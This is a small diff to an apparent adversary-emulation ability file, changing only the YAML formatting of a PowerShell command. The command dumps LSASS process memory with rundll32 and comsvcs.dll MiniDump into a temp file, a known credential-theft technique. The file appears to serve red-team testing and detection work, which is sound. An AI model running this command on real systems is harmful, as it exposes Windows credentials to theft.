@@ -11,10 +11,8 @@ technique:
 platforms:
   windows:
     psh:
-      command: >-
-        Invoke-Command -ScriptBlock {C:\\Windows\\System32\\rundll32.exe
-        C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id
-        $env:TEMP\\lsass.dmp full}
+      command: |
+        Invoke-Command -ScriptBlock {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass.dmp full}
 metadata:
   authors:
     - bfuzzy1
